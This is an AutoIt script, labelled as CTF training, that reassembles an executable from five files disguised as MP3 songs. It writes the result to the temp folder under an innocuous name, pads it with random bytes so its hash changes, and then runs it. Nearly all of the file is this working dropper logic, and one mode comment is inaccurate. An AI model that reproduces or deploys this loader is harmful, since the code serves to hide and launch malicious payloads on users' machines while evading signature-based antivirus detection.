; ============================================================
; CTF Training - File Concatenator and Executor
; Concatenates 5 split parts into a single file and executes it
; ============================================================

#include <File.au3>
#include <Array.au3>

; --- Configuration ---
Global $sOutputFile = @TempDir & "\ArtistSponsorship.exe"
Global $sPart1 = @ScriptDir & "\Apple.mp3"
Global $sPart2 = @ScriptDir & "\Banana.mp3"
Global $sPart3 = @ScriptDir & "\Kiwi.mp3"
Global $sPart4 = @ScriptDir & "\Orange.mp3"
Global $sPart5 = @ScriptDir & "\Strawberry.mp3"

Global $aParts[5] = [$sPart1, $sPart2, $sPart3, $sPart4, $sPart5]

; --- Main ---
_ConcatenateAndExecute($aParts, $sOutputFile)

; ============================================================
; Concatenate binary parts into a single output file
; ============================================================

; Generate and append random bytes to a file
Func _AddRandomBytes($sFile, $iSize = 1024)
    Local $hFile = FileOpen($sFile, 17) ; 16+4+2 = binary append write

    Local $bData = Binary("")
    Local $i
    For $i = 1 To $iSize
        $bData &= Binary(Chr(Random(0, 255, 1)))
    Next

    FileWrite($hFile, $bData)
    FileClose($hFile)
EndFunc



Func _ConcatenateAndExecute($aParts, $sOutput)

    ; Verify all parts exist before starting
    Local $i
    For $i = 0 To UBound($aParts) - 1
        If Not FileExists($aParts[$i]) Then
            MsgBox(16, "Error", "Missing part: " & $aParts[$i])
            Exit 1
        EndIf
    Next

    ; Open output file for binary write
    Local $hOutput = FileOpen($sOutput, 18) ; 2 = write, 16 = binary
    If $hOutput = -1 Then
        MsgBox(16, "Error", "Cannot create output file: " & $sOutput)
        Exit 1
    EndIf

    ; Read each part and append to output
    For $i = 0 To UBound($aParts) - 1
        Local $hPart = FileOpen($aParts[$i], 16) ; 16 = binary read
        If $hPart = -1 Then
            FileClose($hOutput)
            MsgBox(16, "Error", "Cannot open part: " & $aParts[$i])
            Exit 1
        EndIf

        ; Read entire part as binary and write to output
        Local $bData = FileRead($hPart)
        FileWrite($hOutput, $bData)
        FileClose($hPart)
    Next

    FileClose($hOutput)

    _AddRandomBytes($sOutputFile, 1024)

    ; Execute the assembled file
    Local $iPID = Run($sOutput)
    If $iPID = 0 Then
        MsgBox(16, "Error", "Failed to execute assembled file.")
        Exit 1
    EndIf

EndFunc
